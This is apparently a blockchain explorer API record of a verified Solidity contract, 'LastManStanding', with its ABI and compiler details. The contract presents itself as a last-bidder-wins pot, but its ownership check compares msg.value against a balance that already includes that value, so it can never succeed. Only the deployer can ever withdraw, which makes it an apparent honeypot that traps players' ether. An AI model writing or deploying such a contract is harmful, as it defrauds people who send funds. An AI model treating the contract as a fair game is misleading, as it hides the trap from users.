{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.22;\r\n\r\n\r\ncontract LastManStanding {\r\n\r\n    uint lastBlock;\r\n    address owner;\r\n    modifier onlyowner {\r\n        require (msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    function LastManStanding() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function () public payable {\r\n        mineIsBigger();\r\n    }\r\n\r\n    function mineIsBigger() public payable {\r\n        if (msg.value > this.balance) {\r\n            owner = msg.sender;\r\n            lastBlock = now;\r\n        }\r\n    }\r\n\r\n    function withdraw() public onlyowner {\r\n        // if there are no contestants within 5 hours\r\n        // the winner is allowed to take the money\r\n        require(now > lastBlock + 5 hours);\r\n        msg.sender.transfer(this.balance);\r\n    }\r\n   \r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"mineIsBigger\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"LastManStanding","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://ecf5ce6335323d657ae93678b06b5cd7473824ab7561b8bb77b0b81043f6f425"}]}